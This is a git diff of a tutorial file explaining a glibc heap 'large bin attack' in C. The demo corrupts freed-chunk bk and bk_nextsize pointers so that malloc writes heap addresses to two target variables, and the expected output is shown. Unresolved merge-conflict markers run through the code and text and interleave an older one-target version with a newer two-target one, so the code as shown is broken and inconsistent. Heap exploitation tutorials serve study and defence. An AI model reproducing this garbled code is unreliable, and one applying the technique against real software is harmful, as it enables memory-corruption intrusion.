@@ -12,6 +12,7 @@ This like all of the other explanations is a well documented C source file expla
 
 int main(void)
 {
+<<<<<<< HEAD
 	puts("This will be covering large bin attacks.");
 	puts("They are similar to unsorted bin attacks, with that they let us write a pointer.");
 	puts("However like unsorted bin attacks, we can control where the pointer is written to, but not the value of the pointer.");
@@ -25,6 +26,24 @@ int main(void)
 
 	printf("We will start off by allocating six chunks.\n");
 	printf("Three of them will be big enough to go into the large bin.\n");
+=======
+	puts("This will be covering large bin attacks again.");
+	puts("Pretty similar to the last section however with a twist.");
+	puts("This time we will be using a single large bin attack to write to two seperate addresses.");
+	puts("Let's get started.\n");
+
+	unsigned long target0 = 0xdeadbeef;
+	unsigned long target1 = 0x00facade;
+
+	printf("Our goal will be to overwrite the target variables.\n");
+	printf("Target0 address:\t%p\n", &target0);
+	printf("Target0 value:\t\t0x%lx\n\n", target0);
+	printf("Target1 address:\t%p\n", &target1);
+	printf("Target1 value:\t\t0x%lx\n\n", target1);
+
+	printf("We will start off by allocating six chunks.\n");
+	printf("Three of them will be big enough to go into the small/large bins.\n");
+>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
 	printf("The other three chunks will be fastbin size, to prevent consolidation between the large bin size chunks.\n");
 
 	unsigned long *ptr0, *ptr1, *ptr2;
@@ -70,10 +89,20 @@ int main(void)
 	printf("Now here is where the bug comes in.\n");
 	printf("We will need a bug that will allow us to edit the second chunk (the one that is in the unsorted bin).\n");
 	printf("Like with the unsorted bin attack, the bk pointer controls where our write goes to.\n");
+<<<<<<< HEAD
 	printf("We will also need to zero out the fwd pointer.\n");
 
 	ptr1[0] = 0;
 	ptr1[1] = (unsigned long)((&target) - 0x2);
+=======
+	printf("However this time, we will also be overwritting the fwd_nextsize and bk_nextsize pointers to give us the second write.\n");
+	printf("We will also need to zero out the fwd pointer.\n");
+
+	ptr1[0] = 0;
+	ptr1[1] = (unsigned long)((&target0) - 0x2);
+	ptr1[2] = 0;
+	ptr1[3] = (unsigned long)((&target1) - 0x4);
+>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
 
 	printf("We will also need to overwrite it's size values with a smaller value.\n\n");
 
@@ -89,7 +118,12 @@ int main(void)
 	malloc(0x10);
 
 	printf("With that, we can see that the value of the target is:\n");
+<<<<<<< HEAD
 	printf("Target value:\t0x%lx\n", target);
+=======
+	printf("Target0 value:\t0x%lx\n", target0);
+	printf("Target1 value:\t0x%lx\n", target1);
+>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
 
 }
 ```
@@ -146,4 +180,8 @@ This is where our write happens.
 With that, we can see that the value of the target is:
 Target0 value:	0x9f3b70
 Target1 value:	0x9f3b70
+<<<<<<< HEAD
 ```
+=======
+```
+>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
